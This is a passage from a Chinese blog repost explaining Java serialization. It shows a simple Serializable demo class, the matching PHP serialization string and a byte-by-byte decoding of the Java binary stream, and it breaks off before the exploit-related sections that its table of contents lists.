<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>浅析Java序列化和反序列化 [转载] | Manayakko - 微笑才是王道</title><meta name="description" content="浅析Java序列化和反序列化 [转载]"><meta name="keywords" content="code audit"><meta name="author" content="晓黑"><meta name="copyright" content="晓黑"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/yakko1216.github.io/img/favicon.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><meta name="twitter:card" content="summary"><meta name="twitter:title" content="浅析Java序列化和反序列化 [转载]"><meta name="twitter:description" content="浅析Java序列化和反序列化 [转载]"><meta name="twitter:image" content="https://www.suk1.top/img/index2.jpg"><meta property="og:type" content="article"><meta property="og:title" content="浅析Java序列化和反序列化 [转载]"><meta property="og:url" content="https://www.suk1.top/2020/02/28/about-java-serialization-and-deserialization/"><meta property="og:site_name" content="Manayakko - 微笑才是王道"><meta property="og:description" content="浅析Java序列化和反序列化 [转载]"><meta property="og:image" content="https://www.suk1.top/img/index2.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/yakko1216.github.io/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.suk1.top/2020/02/28/about-java-serialization-and-deserialization/"><link rel="prev" title="PTA a题" href="https://www.suk1.top/2020/03/02/PTAbasic/"><link rel="next" title="Python 爬虫学习记录" href="https://www.suk1.top/2020/02/28/pySpider/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/yakko1216.github.io/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: false,
  copyright: {"languages":{"author":"作者: 晓黑","link":"链接: https://www.suk1.top/2020/02/28/about-java-serialization-and-deserialization/","source":"来源: Manayakko - 微笑才是王道","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/yakko1216.github.io/atom.xml" title="Manayakko - 微笑才是王道" type="application/atom+xml">
</head><body><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/yakko1216.github.io/">Manayakko - 微笑才是王道</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/about/"><i class="fa-fw fa fa-simplybuilt"></i><span> 关于本人</span></a></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/yakko1216.github.io/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/yakko1216.github.io/archives/"><div class="headline">文章</div><div class="length_num">57</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/yakko1216.github.io/tags/"><div class="headline">标签</div><div class="length_num">10</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/yakko1216.github.io/categories/"><div class="headline">分类</div><div class="length_num">3</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/link/"><i class="fa-fw fa fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/yakko1216.github.io/about/"><i class="fa-fw fa fa-simplybuilt"></i><span> 关于本人</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#浅析Java序列化和反序列化"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">浅析Java序列化和反序列化</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#序列化机制"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">序列化机制</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#序列化"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">序列化</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#简单序列化示例"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">简单序列化示例</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Java序列化二进制字符串"><span class="toc_mobile_items-number">2.2.1.</span> <span class="toc_mobile_items-text">Java序列化二进制字符串</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#让我们把这个对象再改复杂些："><span class="toc_mobile_items-number">2.2.2.</span> <span class="toc_mobile_items-text">让我们把这个对象再改复杂些：</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#反序列化"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">反序列化</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#继续用简单的示例来看看反序列化："><span class="toc_mobile_items-number">2.3.1.</span> <span class="toc_mobile_items-text">继续用简单的示例来看看反序列化：</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#关于SerialVersionUID"><span class="toc_mobile_items-number">2.3.2.</span> <span class="toc_mobile_items-text">关于SerialVersionUID</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#关于writeReplace-和readResolve"><span class="toc_mobile_items-number">2.3.3.</span> <span class="toc_mobile_items-text">关于writeReplace()和readResolve()</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#关于Externalizable"><span class="toc_mobile_items-number">2.3.4.</span> <span class="toc_mobile_items-text">关于Externalizable</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#反序列化漏洞"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">反序列化漏洞</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#经典的Apache-Commons-Collections"><span class="toc_mobile_items-number">2.4.1.</span> <span class="toc_mobile_items-text">经典的Apache Commons Collections</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Payload构造"><span class="toc_mobile_items-number">2.5.</span> <span class="toc_mobile_items-text">Payload构造</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#修复方案"><span class="toc_mobile_items-number">2.6.</span> <span class="toc_mobile_items-text">修复方案</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#POP的艺术"><span class="toc_mobile_items-number">2.7.</span> <span class="toc_mobile_items-text">POP的艺术</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#BeanShell1"><span class="toc_mobile_items-number">2.7.1.</span> <span class="toc_mobile_items-text">BeanShell1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#C3P0"><span class="toc_mobile_items-number">2.7.2.</span> <span class="toc_mobile_items-text">C3P0</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Clojure"><span class="toc_mobile_items-number">2.7.3.</span> <span class="toc_mobile_items-text">Clojure</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsBeanutils1"><span class="toc_mobile_items-number">2.7.4.</span> <span class="toc_mobile_items-text">CommonsBeanutils1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections1"><span class="toc_mobile_items-number">2.7.5.</span> <span class="toc_mobile_items-text">CommonsCollections1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections2"><span class="toc_mobile_items-number">2.7.6.</span> <span class="toc_mobile_items-text">CommonsCollections2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections3"><span class="toc_mobile_items-number">2.7.7.</span> <span class="toc_mobile_items-text">CommonsCollections3</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections4"><span class="toc_mobile_items-number">2.7.8.</span> <span class="toc_mobile_items-text">CommonsCollections4</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections5"><span class="toc_mobile_items-number">2.7.9.</span> <span class="toc_mobile_items-text">CommonsCollections5</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#CommonsCollections6"><span class="toc_mobile_items-number">2.7.10.</span> <span class="toc_mobile_items-text">CommonsCollections6</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Groovy1"><span class="toc_mobile_items-number">2.7.11.</span> <span class="toc_mobile_items-text">Groovy1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Hibernate1"><span class="toc_mobile_items-number">2.7.12.</span> <span class="toc_mobile_items-text">Hibernate1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Hibernate2"><span class="toc_mobile_items-number">2.7.13.</span> <span class="toc_mobile_items-text">Hibernate2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#JBossInterceptors1"><span class="toc_mobile_items-number">2.7.14.</span> <span class="toc_mobile_items-text">JBossInterceptors1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#JSON1"><span class="toc_mobile_items-number">2.7.15.</span> <span class="toc_mobile_items-text">JSON1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#JavassistWeld1"><span class="toc_mobile_items-number">2.7.16.</span> <span class="toc_mobile_items-text">JavassistWeld1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Jdk7u21"><span class="toc_mobile_items-number">2.7.17.</span> <span class="toc_mobile_items-text">Jdk7u21</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#MozillaRhino1"><span class="toc_mobile_items-number">2.7.18.</span> <span class="toc_mobile_items-text">MozillaRhino1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Myfaces1"><span class="toc_mobile_items-number">2.7.19.</span> <span class="toc_mobile_items-text">Myfaces1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Myfaces2"><span class="toc_mobile_items-number">2.7.20.</span> <span class="toc_mobile_items-text">Myfaces2</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#ROME"><span class="toc_mobile_items-number">2.7.21.</span> <span class="toc_mobile_items-text">ROME</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Spring1"><span class="toc_mobile_items-number">2.7.22.</span> <span class="toc_mobile_items-text">Spring1</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Spring2"><span class="toc_mobile_items-number">2.7.23.</span> <span class="toc_mobile_items-text">Spring2</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#总结"><span class="toc_mobile_items-number">2.8.</span> <span class="toc_mobile_items-text">总结</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#参考"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">参考</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#浅析Java序列化和反序列化"><span class="toc-number">1.</span> <span class="toc-text">浅析Java序列化和反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#序列化机制"><span class="toc-number">2.</span> <span class="toc-text">序列化机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#序列化"><span class="toc-number">2.1.</span> <span class="toc-text">序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单序列化示例"><span class="toc-number">2.2.</span> <span class="toc-text">简单序列化示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java序列化二进制字符串"><span class="toc-number">2.2.1.</span> <span class="toc-text">Java序列化二进制字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#让我们把这个对象再改复杂些："><span class="toc-number">2.2.2.</span> <span class="toc-text">让我们把这个对象再改复杂些：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化"><span class="toc-number">2.3.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#继续用简单的示例来看看反序列化："><span class="toc-number">2.3.1.</span> <span class="toc-text">继续用简单的示例来看看反序列化：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于SerialVersionUID"><span class="toc-number">2.3.2.</span> <span class="toc-text">关于SerialVersionUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于writeReplace-和readResolve"><span class="toc-number">2.3.3.</span> <span class="toc-text">关于writeReplace()和readResolve()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于Externalizable"><span class="toc-number">2.3.4.</span> <span class="toc-text">关于Externalizable</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化漏洞"><span class="toc-number">2.4.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#经典的Apache-Commons-Collections"><span class="toc-number">2.4.1.</span> <span class="toc-text">经典的Apache Commons Collections</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload构造"><span class="toc-number">2.5.</span> <span class="toc-text">Payload构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">2.6.</span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP的艺术"><span class="toc-number">2.7.</span> <span class="toc-text">POP的艺术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BeanShell1"><span class="toc-number">2.7.1.</span> <span class="toc-text">BeanShell1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0"><span class="toc-number">2.7.2.</span> <span class="toc-text">C3P0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Clojure"><span class="toc-number">2.7.3.</span> <span class="toc-text">Clojure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsBeanutils1"><span class="toc-number">2.7.4.</span> <span class="toc-text">CommonsBeanutils1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections1"><span class="toc-number">2.7.5.</span> <span class="toc-text">CommonsCollections1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections2"><span class="toc-number">2.7.6.</span> <span class="toc-text">CommonsCollections2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections3"><span class="toc-number">2.7.7.</span> <span class="toc-text">CommonsCollections3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections4"><span class="toc-number">2.7.8.</span> <span class="toc-text">CommonsCollections4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections5"><span class="toc-number">2.7.9.</span> <span class="toc-text">CommonsCollections5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CommonsCollections6"><span class="toc-number">2.7.10.</span> <span class="toc-text">CommonsCollections6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Groovy1"><span class="toc-number">2.7.11.</span> <span class="toc-text">Groovy1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hibernate1"><span class="toc-number">2.7.12.</span> <span class="toc-text">Hibernate1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hibernate2"><span class="toc-number">2.7.13.</span> <span class="toc-text">Hibernate2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JBossInterceptors1"><span class="toc-number">2.7.14.</span> <span class="toc-text">JBossInterceptors1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON1"><span class="toc-number">2.7.15.</span> <span class="toc-text">JSON1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavassistWeld1"><span class="toc-number">2.7.16.</span> <span class="toc-text">JavassistWeld1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jdk7u21"><span class="toc-number">2.7.17.</span> <span class="toc-text">Jdk7u21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MozillaRhino1"><span class="toc-number">2.7.18.</span> <span class="toc-text">MozillaRhino1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Myfaces1"><span class="toc-number">2.7.19.</span> <span class="toc-text">Myfaces1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Myfaces2"><span class="toc-number">2.7.20.</span> <span class="toc-text">Myfaces2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROME"><span class="toc-number">2.7.21.</span> <span class="toc-text">ROME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring1"><span class="toc-number">2.7.22.</span> <span class="toc-text">Spring1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring2"><span class="toc-number">2.7.23.</span> <span class="toc-text">Spring2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">2.8.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(/img/index2.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">浅析Java序列化和反序列化 [转载]</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-02-28<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-03-03</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/yakko1216.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></span><div class="post-meta-wordcount"><div class="post-meta-pv-cv"></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><p>github 上看到的，边看边学，边记笔记<br><a href="https://github.com/gyyyy" target="_blank" rel="noopener">感谢宫音师傅的文章</a></p>
<a id="more"></a>

<h1 id="浅析Java序列化和反序列化"><a href="#浅析Java序列化和反序列化" class="headerlink" title="浅析Java序列化和反序列化"></a>浅析Java序列化和反序列化</h1><p>别说你懂反序列化，也别再说你不懂反序列化。</p>
<h1 id="序列化机制"><a href="#序列化机制" class="headerlink" title="序列化机制"></a>序列化机制</h1><p>序列化 <code>Serialization</code> 是指将数据结构或对象状态转换成字节流，例如 <code>存储成文件、内存缓冲，或经由网络传输</code> ，以留待后续在相同或另一台计算机环境中，能够恢复对象原来状态的过程。序列化机制在Java中有着广泛的应用，<code>EJB、RMI、Hessian</code> 等技术都以此为基础。</p>
<hr>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>我们先用一个简单的序列化示例来看看Java究竟是如何对一个对象进行序列化的：</p>
<h2 id="简单序列化示例"><a href="#简单序列化示例" class="headerlink" title="简单序列化示例"></a>简单序列化示例</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bout);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> SerializationDemo(<span class="string">"gyyyy"</span>, <span class="number">97777</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果熟悉PHP的同学应该知道，这个对象在经过PHP序列化后得到的字符串如下 <font color="#0099ff">因为PHP与Java的编程习惯有所区别</font>，这里字段访问权限全改为了<code>public</code>，<code>private</code>和<code>protected</code>从表现形式上来说差不多，只是多了些特殊的标识而已，为了减少一些零基础的同学不必要的疑惑，这里暂不讨论：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:17:&quot;SerializationDemo&quot;:2:&#123;s:11:&quot;stringField&quot;;s:5:&quot;gyyyy&quot;;s:8:&quot;intField&quot;;i:97777;&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中，<code>O:17:&quot;...&quot;</code> 表示当前是一个 <code>(Object)对象</code>，以及该对象类名的字符串长度和值，<code>2:{...}</code> 表示该类有2个字段 （元素间用 <code>;</code> 分隔，键值对也分为前后两个元素表示，也就是说，如果是2个字段，则总共会包含4个元素），<code>s:11:&quot;...&quot;</code> 表示当前是一个长度为11的字符串，<code>i:...</code> 表示当前是一个 <code>整数(integer)</code>。</p>
<p>由此可知，PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致。我们完全可以通过手工的方式来构造任意一个PHP对象的序列化字符串。</p>
<hr>
<h3 id="Java序列化二进制字符串"><a href="#Java序列化二进制字符串" class="headerlink" title="Java序列化二进制字符串"></a>Java序列化二进制字符串</h3><p><font color="#0099ff">而该对象经过Java序列化后得到的则是一个二进制串：</font></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f d9 35 3c f7 d6 0a c6    ationDem o.5&lt;....</span><br><span class="line">d5 02 00 02 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 0b 73 74 72 69 6e 67  46 69 65 6c 64 74 00 12    ..string Fieldt..</span><br><span class="line">4c 6a 61 76 61 2f 6c 61  6e 67 2f 53 74 72 69 6e    Ljava&#x2F;la ng&#x2F;Strin</span><br><span class="line">67 3b 78 70 00 01 7d f1  74 00 05 67 79 79 79 79    g;xp..&#125;. t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>仔细观察二进制串中的部分可读数据，我们也可以差不多分辨出该对象的一些基本内容。但同样为了手写的目的 <em>（为什么有这个目的？原因很简单，为了不被语言环境束缚）</em> ，以及为接下来的序列化执行流程分析做准备，我们先依次来解读一下这个二进制串中的各个元素。</p>
<ul>
<li><code>0xaced</code>，魔术头</li>
<li><code>0x0005</code>，版本号 （JDK主流版本一致，下文如无特殊标注，都以<font color="red">JDK8u</font>为例）</li>
<li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li>
<li><code>0x72</code>，类描述符标识</li>
<li><code>0x0011...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li>
<li><code>0xd9353cf7d60ac6d5</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li>
